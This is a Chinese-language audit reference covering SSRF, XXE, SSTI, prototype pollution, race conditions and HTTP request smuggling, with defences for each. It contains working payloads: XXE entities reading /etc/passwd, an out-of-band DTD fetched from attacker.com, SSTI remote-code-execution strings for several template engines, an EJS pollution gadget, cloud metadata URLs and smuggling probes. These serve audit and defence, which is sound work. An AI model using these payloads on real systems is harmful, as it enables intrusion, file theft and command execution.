# 高级攻击专题

> D6/SSRF/SSTI 审计时加载。覆盖 SSRF、XXE、SSTI、原型污染、竞态条件、HTTP 走私。

---

## SSRF（Server-Side Request Forgery）

### 攻击面

| 功能 | SSRF 入口 | 检查要点 |
|------|----------|---------|
| URL 预览/抓取 | `fetch(userUrl)` | URL 白名单? |
| Webhook 配置 | 用户配置回调 URL | 目标地址校验? |
| 文件导入（URL） | 从 URL 导入文件 | 协议限制? |
| 图片/头像 URL | 远程图片加载 | 私网地址过滤? |
| PDF 生成 | HTML→PDF 含远程资源 | 资源加载限制? |
| OAuth 回调 | redirect_uri 可控 | 严格匹配? |
| 代理/转发 | 内部代理服务 | 目标限制? |

### 绕过技术

| 绕过方式 | 示例 | 防护 |
|---------|------|------|
| IP 地址变形 | `127.0.0.1` → `0x7f000001` / `2130706433` / `017700000001` | 解析后检查 |
| DNS Rebinding | 第一次解析→公网IP，第二次→127.0.0.1 | 绑定解析结果 |
| 重定向 | 公网URL→302→内网地址 | 禁止跟随重定向 |
| URL 解析差异 | `http://evil.com@127.0.0.1` | 统一 URL 解析库 |
| IPv6 | `http://[::1]` / `http://[::ffff:127.0.0.1]` | 检查 IPv6 |
| 短链/域名 | `http://短链→内网` | 解析最终地址 |
| 协议走私 | `gopher://`, `dict://`, `file://` | 白名单协议 |

### 云元数据地址

| 云平台 | 元数据地址 |
|--------|-----------|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure | `http://169.254.169.254/metadata/instance` |
| 阿里云 | `http://100.100.100.200/latest/meta-data/` |
| 腾讯云 | `http://metadata.tencentyun.com/latest/meta-data/` |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` |

### 防护方案

```
1. URL 白名单（最安全）
   - 只允许特定域名/IP
   - 正则匹配域名（注意: evil.example.com 不应匹配 example.com）

2. 黑名单 + 解析检查
   - 解析 URL → 获取 IP → 检查是否私网
   - 私网范围: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16
   - 禁止 file://, gopher://, dict:// 协议
   - 禁止跟随重定向（或重定向后再次检查）

3. 网络层隔离
   - 出站请求通过代理
   - 代理层过滤私网地址
```

---

## XXE（XML External Entity）

### 攻击向量

```xml
<!-- 文件读取 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/api">
]>

<!-- 参数实体 OOB（无回显时） -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>

<!-- Billion Laughs DoS -->
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
```

### 各语言防护

| 语言 | 安全配置 |
|------|---------|
| Java | `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` |
| Python | `defusedxml` 库 / `lxml` 的 `resolve_entities=False` |
| PHP | `libxml_disable_entity_loader(true)` (PHP < 8.0) |
| .NET | `XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit }` |
| Go | `encoding/xml` 默认安全（不支持外部实体） |

---

## SSTI（Server-Side Template Injection）

### 检测方法

```
注入测试 payload（按模板引擎）:

通用检测: {{7*7}} → 49 说明存在 SSTI

Jinja2 (Python):
  {{config}} → 泄露配置
  {{''.__class__.__mro__[1].__subclasses__()}} → 类列表
  {{lipsum.__globals__['os'].popen('id').read()}} → RCE

Twig (PHP):
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

Freemarker (Java):
  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

Velocity (Java):
  #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))

Thymeleaf (Java):
  __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
  注意: th:text 安全, th:utext 不安全

Pebble (Java):
  {% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}

ERB (Ruby):
  <%= system('id') %>
  <%= `id` %>
```

### 防护
- 不要将用户输入作为模板内容（应作为模板变量）
- 使用沙箱模式（Jinja2 SandboxedEnvironment）
- 白名单可用的模板函数/过滤器

---

## 原型污染（Prototype Pollution）

### 攻击原理

```javascript
// JavaScript 对象继承链
obj.__proto__ === Object.prototype

// 污染 Object.prototype 影响所有对象
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, malicious);
// 现在: ({}).isAdmin === true

// 危险的合并函数
lodash.merge(target, source)
lodash.defaultsDeep(target, source)
jQuery.extend(true, target, source)
hoek.merge(target, source)
```

### 利用链

| 场景 | 污染属性 | 效果 |
|------|---------|------|
| Handlebars | `__proto__.type = 'Program'` | RCE |
| Pug/Jade | `__proto__.block.type = 'Text'` | RCE |
| EJS | `__proto__.outputFunctionName = 'x;process.mainModule.require("child_process").execSync("id")'` | RCE |
| child_process | `__proto__.shell = '/proc/self/exe'` | 命令劫持 |
| 权限绕过 | `__proto__.isAdmin = true` | 提权 |
| DoS | `__proto__.toString = null` | 崩溃 |

### 防护
```javascript
// 1. 使用 Object.create(null) 创建无原型对象
const safe = Object.create(null);

// 2. 过滤危险键
function safeMerge(target, source) {
    for (const key of Object.keys(source)) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
        target[key] = source[key];
    }
}

// 3. 使用 Map 代替普通对象
const config = new Map();

// 4. Object.freeze(Object.prototype) — 可能破坏兼容性
```

---

## 竞态条件（Race Condition）

### 常见场景

| 场景 | 攻击方式 | 检查要点 |
|------|---------|---------|
| 余额扣减 | 并发请求同时扣减 | 数据库行锁/乐观锁? |
| 优惠券领取 | 并发领取同一张券 | 唯一约束/原子操作? |
| 库存扣减 | 并发下单超卖 | `SELECT FOR UPDATE`? |
| 文件上传 | TOCTOU（检查后替换） | 原子操作? |
| 密码重置 | 并发使用同一 token | token 一次性使用? |
| 转账 | 并发转出超过余额 | 事务+行锁? |

### 检测方法

```
1. 搜索"读取→判断→写入"模式（中间没有锁）:
   balance = getBalance(userId)
   if balance >= amount:
       setBalance(userId, balance - amount)  // 竞态窗口!

2. 搜索缺少锁的数据库操作:
   - 无 SELECT ... FOR UPDATE
   - 无 @Version 乐观锁
   - 无 UNIQUE 约束
   - 无分布式锁（Redis SETNX）

3. 搜索非原子的状态变更:
   order = getOrder(id)
   if order.status == 'pending':
       order.status = 'paid'
       save(order)  // 竞态窗口!
```

### 防护方案

| 方案 | 适用场景 | 实现 |
|------|---------|------|
| 数据库行锁 | 单数据库 | `SELECT ... FOR UPDATE` |
| 乐观锁 | 低冲突场景 | `@Version` / `WHERE version = ?` |
| 唯一约束 | 防重复 | `UNIQUE INDEX` |
| 分布式锁 | 微服务 | Redis `SETNX` / Redisson |
| 幂等键 | 防重放 | 请求 ID + 唯一约束 |
| 原子操作 | 计数器 | `UPDATE SET balance = balance - ? WHERE balance >= ?` |

---

## HTTP 请求走私（HTTP Request Smuggling）

### 攻击原理

前端代理（Nginx/CDN）和后端服务器对 HTTP 请求边界的解析不一致。

### 类型

| 类型 | 前端 | 后端 | 利用 |
|------|------|------|------|
| CL.TE | Content-Length | Transfer-Encoding | 前端按 CL 切分，后端按 TE 切分 |
| TE.CL | Transfer-Encoding | Content-Length | 前端按 TE 切分，后端按 CL 切分 |
| TE.TE | Transfer-Encoding | Transfer-Encoding | 混淆 TE 头让一方忽略 |

### 检测

```
CL.TE 检测:
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

G

→ 如果第二个请求返回 "Unrecognized method GPOST" → 存在走私

TE.CL 检测:
POST / HTTP/1.1
Content-Length: 3
Transfer-Encoding: chunked

1
G
0

→ 如果超时或异常 → 可能存在走私
```

### 利用场景
- 绕过前端 WAF/认证
- 缓存投毒
- 请求劫持（获取其他用户的请求）
- 开放重定向

### 防护
- 前后端使用相同的 HTTP 解析器
- 禁止模糊的请求（同时有 CL 和 TE）
- 使用 HTTP/2（二进制帧，无歧义）
- 规范化请求头
